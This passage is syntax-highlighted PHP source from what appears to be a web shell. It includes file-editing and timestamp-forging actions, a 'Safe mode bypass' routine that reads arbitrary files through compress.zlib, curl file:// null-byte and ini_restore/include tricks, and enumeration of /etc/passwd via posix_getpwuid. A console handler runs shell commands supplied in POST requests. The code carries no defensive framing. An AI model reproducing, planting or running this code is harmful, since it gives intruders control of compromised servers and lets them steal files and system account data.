<span class="lineno"> 780</span>         <span class="k">case</span> <span class="s1">&#39;edit&#39;</span><span class="o">:</span> 
<span class="lineno"> 781</span>             <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 782</span>                 <span class="k">echo</span> <span class="s1">&#39;File isn\&#39;t writeable&#39;</span><span class="p">;</span> 
<span class="lineno"> 783</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 784</span>             <span class="p">}</span> 
<span class="lineno"> 785</span>             <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 786</span>                 <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span> 
<span class="lineno"> 787</span>                 <span class="k">echo</span> <span class="s1">&#39;Saved!&lt;br&gt;&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 788</span>             <span class="p">}</span> 
<span class="lineno"> 789</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;form onsubmit=&quot;g(null,null,null,null,this.text.value);return false;&quot;&gt;&lt;textarea name=text class=bigarea&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 790</span>             <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span> 
<span class="lineno"> 791</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 792</span>                 <span class="k">while</span><span class="p">(</span> <span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno"> 793</span>                     <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span> 
<span class="lineno"> 794</span>                 <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> 
<span class="lineno"> 795</span>             <span class="p">}</span> 
<span class="lineno"> 796</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;/textarea&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 797</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 798</span>         <span class="k">case</span> <span class="s1">&#39;hexdump&#39;</span><span class="o">:</span> 
<span class="lineno"> 799</span>             <span class="nv">$c</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span> 
<span class="lineno"> 800</span>             <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno"> 801</span>             <span class="nv">$h</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;00000000&lt;br&gt;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span> 
<span class="lineno"> 802</span>             <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span> 
<span class="lineno"> 803</span>             <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$len</span><span class="p">;</span> <span class="o">++</span><span class="nv">$i</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 804</span>                 <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%02X&#39;</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="p">;</span> 
<span class="lineno"> 805</span>                 <span class="k">switch</span> <span class="p">(</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 806</span>                     <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>  <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 807</span>                     <span class="k">case</span> <span class="mi">9</span><span class="o">:</span>  <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 808</span>                     <span class="k">case</span> <span class="mi">10</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 809</span>                     <span class="k">case</span> <span class="mi">13</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 810</span>                     <span class="k">default</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 811</span>                 <span class="p">}</span> 
<span class="lineno"> 812</span>                 <span class="nv">$n</span><span class="o">++</span><span class="p">;</span> 
<span class="lineno"> 813</span>                 <span class="k">if</span> <span class="p">(</span><span class="nv">$n</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 814</span>                     <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno"> 815</span>                     <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span><span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%08X&#39;</span><span class="p">,</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;}</span> 
<span class="lineno"> 816</span>                     <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 817</span>                     <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 818</span>                 <span class="p">}</span> 
<span class="lineno"> 819</span>              <span class="p">}</span> 
<span class="lineno"> 820</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;table cellspacing=1 cellpadding=5 bgcolor=#222222&gt;&lt;tr&gt;&lt;td bgcolor=#333333&gt;&lt;span style=&quot;font-weight: normal;&quot;&gt;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&lt;/span&gt;&lt;/td&gt;&lt;td bgcolor=#282828&gt;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&lt;/td&gt;&lt;td bgcolor=#333333&gt;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 821</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 822</span>         <span class="k">case</span> <span class="s1">&#39;rename&#39;</span><span class="o">:</span> 
<span class="lineno"> 823</span>             <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 824</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span> 
<span class="lineno"> 825</span>                     <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t rename!&lt;br&gt;&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 826</span>                 <span class="k">else</span> 
<span class="lineno"> 827</span>                     <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;script&gt;g(null,null,&quot;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;,null,&quot;&quot;)&lt;/script&gt;&#39;</span><span class="p">);</span> 
<span class="lineno"> 828</span>             <span class="p">}</span> 
<span class="lineno"> 829</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;form onsubmit=&quot;g(null,null,null,null,this.name.value);return false;&quot;&gt;&lt;input type=text name=name value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 830</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 831</span>         <span class="k">case</span> <span class="s1">&#39;touch&#39;</span><span class="o">:</span> 
<span class="lineno"> 832</span>             <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 833</span>                 <span class="nv">$time</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span> 
<span class="lineno"> 834</span>                 <span class="k">if</span><span class="p">(</span><span class="nv">$time</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 835</span>                     <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$time</span><span class="p">,</span><span class="nv">$time</span><span class="p">))</span> 
<span class="lineno"> 836</span>                         <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;script&gt;g(null,null,null,null,&quot;&quot;)&lt;/script&gt;&#39;</span><span class="p">);</span> 
<span class="lineno"> 837</span>                     <span class="k">else</span> <span class="p">{</span> 
<span class="lineno"> 838</span>                         <span class="k">echo</span> <span class="s1">&#39;Fail!&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 839</span>                     <span class="p">}</span> 
<span class="lineno"> 840</span>                 <span class="p">}</span> <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;Bad time format!&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 841</span>             <span class="p">}</span> 
<span class="lineno"> 842</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;form onsubmit=&quot;g(null,null,null,null,this.touch.value);return false;&quot;&gt;&lt;input type=text name=touch value=&quot;&#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s&quot;</span><span class="p">,</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 843</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 844</span>         <span class="k">case</span> <span class="s1">&#39;mkfile&#39;</span><span class="o">:</span> 
<span class="lineno"> 845</span>              
<span class="lineno"> 846</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 847</span>     <span class="p">}</span> 
<span class="lineno"> 848</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 849</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 850</span> <span class="p">}</span> 
<span class="lineno"> 851</span> 
<span class="lineno"> 852</span> <span class="k">function</span> <span class="nf">actionSafeMode</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 853</span>     <span class="nv">$temp</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span> 
<span class="lineno"> 854</span>     <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 855</span>     <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno"> 856</span>         <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> 
<span class="lineno"> 857</span>             <span class="nv">$temp</span><span class="o">=@</span><span class="nb">tempnam</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span> <span class="s1">&#39;cx&#39;</span><span class="p">);</span> 
<span class="lineno"> 858</span>             <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="s2">&quot;compress.zlib://&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="nv">$temp</span><span class="p">)){</span> 
<span class="lineno"> 859</span>                 <span class="k">echo</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span> 
<span class="lineno"> 860</span>                 <span class="nb">unlink</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span> 
<span class="lineno"> 861</span>             <span class="p">}</span> <span class="k">else</span> 
<span class="lineno"> 862</span>                 <span class="k">echo</span> <span class="s1">&#39;Sorry... Can\&#39;t open file&#39;</span><span class="p">;</span> 
<span class="lineno"> 863</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 864</span>         <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> 
<span class="lineno"> 865</span>             <span class="nv">$files</span> <span class="o">=</span> <span class="nb">glob</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;*&#39;</span><span class="p">);</span> 
<span class="lineno"> 866</span>             <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$files</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno"> 867</span>                 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$filename</span><span class="p">)</span> 
<span class="lineno"> 868</span>                     <span class="k">echo</span> <span class="nv">$filename</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 869</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 870</span>         <span class="k">case</span> <span class="mi">3</span><span class="o">:</span> 
<span class="lineno"> 871</span>             <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">(</span><span class="s2">&quot;file://&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">SELF_PATH</span><span class="p">);</span> 
<span class="lineno"> 872</span>             <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span> 
<span class="lineno"> 873</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 874</span>         <span class="k">case</span> <span class="mi">4</span><span class="o">:</span> 
<span class="lineno"> 875</span>             <span class="nb">ini_restore</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">);</span> 
<span class="lineno"> 876</span>             <span class="nb">ini_restore</span><span class="p">(</span><span class="s2">&quot;open_basedir&quot;</span><span class="p">);</span> 
<span class="lineno"> 877</span>             <span class="k">include</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span> 
<span class="lineno"> 878</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 879</span>         <span class="k">case</span> <span class="mi">5</span><span class="o">:</span> 
<span class="lineno"> 880</span>             <span class="k">for</span><span class="p">(;</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">];</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 881</span>                 <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span> 
<span class="lineno"> 882</span>                 <span class="k">if</span> <span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> 
<span class="lineno"> 883</span>                     <span class="k">echo</span> <span class="nb">join</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="nv">$uid</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 884</span>             <span class="p">}</span> 
<span class="lineno"> 885</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 886</span>         <span class="k">case</span> <span class="mi">6</span><span class="o">:</span> 
<span class="lineno"> 887</span>             <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;imap_open&#39;</span><span class="p">))</span><span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 888</span>             <span class="nv">$stream</span> <span class="o">=</span> <span class="nb">imap_open</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">);</span> 
<span class="lineno"> 889</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$stream</span> <span class="o">==</span> <span class="k">FALSE</span><span class="p">)</span> 
<span class="lineno"> 890</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 891</span>             <span class="k">echo</span> <span class="nb">imap_body</span><span class="p">(</span><span class="nv">$stream</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
<span class="lineno"> 892</span>             <span class="nb">imap_close</span><span class="p">(</span><span class="nv">$stream</span><span class="p">);</span> 
<span class="lineno"> 893</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 894</span>     <span class="p">}</span> 
<span class="lineno"> 895</span>     <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span> 
<span class="lineno"> 896</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 897</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Safe mode bypass&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 898</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;Copy (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;1&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Glob (list dir)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;2&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Curl (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;3&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Ini_restore (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;4&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Posix_getpwuid (&quot;Read&quot; /etc/passwd)&lt;/span&gt;&lt;table&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;5&quot;,this.param1.value,this.param2.value);return false;\&#39;&gt;&lt;tr&gt;&lt;td&gt;From&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param1 value=0&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;To&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param2 value=1000&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;span&gt;Imap_open (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;6&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 899</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> 
<span class="lineno"> 900</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=&quot;ml1&quot; style=&quot;margin-top:5px&quot; id=&quot;Output&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$temp</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 901</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 902</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 903</span> <span class="p">}</span> 
<span class="lineno"> 904</span> 
<span class="lineno"> 905</span> <span class="k">function</span> <span class="nf">actionConsole</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 906</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 907</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno"> 908</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 909</span>         <span class="k">echo</span> <span class="s2">&quot;document.cf.cmd.value=&#39;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 910</span>         <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">iconv</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">],</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">$ &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">));</span> 
<span class="lineno"> 911</span>         <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;!.*cd\s+([^;]+)$!&quot;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$match</span><span class="p">))</span>    <span class="p">{</span> 
<span class="lineno"> 912</span>             <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 913</span>                 <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span> 
<span class="lineno"> 914</span>                 <span class="k">echo</span> <span class="s2">&quot;document.mf.c.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span> 
<span class="lineno"> 915</span>             <span class="p">}</span> 
<span class="lineno"> 916</span>         <span class="p">}</span> 
<span class="lineno"> 917</span>         <span class="k">echo</span> <span class="s2">&quot;document.cf.output.value+=&#39;&quot;</span><span class="o">.</span><span class="nv">$temp</span><span class="o">.</span><span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span> 
<span class="lineno"> 918</span>         <span class="k">echo</span> <span class="s2">&quot;document.cf.output.scrollTop = document.cf.output.scrollHeight;&quot;</span><span class="p">;</span> 
<span class="lineno"> 919</span>         <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span> 
<span class="lineno"> 920</span>         <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span> 
<span class="lineno"> 921</span>         <span class="k">exit</span><span class="p">;</span> 
<span class="lineno"> 922</span>     <span class="p">}</span> 
<span class="lineno"> 923</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 924</span> <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 925</span> <span class="x">&lt;script&gt; </span>
<span class="lineno"> 926</span> <span class="x">if(window.Event) window.captureEvents(Event.KEYDOWN); </span>
<span class="lineno"> 927</span> <span class="x">var cmds = new Array(&quot;&quot;); </span>
<span class="lineno"> 928</span> <span class="x">var cur = 0; </span>
<span class="lineno"> 929</span> <span class="x">function kp(e) { </span>
<span class="lineno"> 930</span> <span class="x">    var n = (window.Event) ? e.which : e.keyCode; </span>
<span class="lineno"> 931</span> <span class="x">    if(n == 38) { </span>
<span class="lineno"> 932</span> <span class="x">        cur--; </span>
<span class="lineno"> 933</span> <span class="x">        if(cur&gt;=0) </span>
<span class="lineno"> 934</span> <span class="x">            document.cf.cmd.value = cmds[cur]; </span>
<span class="lineno"> 935</span> <span class="x">        else </span>
<span class="lineno"> 936</span> <span class="x">            cur++; </span>
<span class="lineno"> 937</span> <span class="x">    } else if(n == 40) { </span>
<span class="lineno"> 938</span> <span class="x">        cur++; </span>
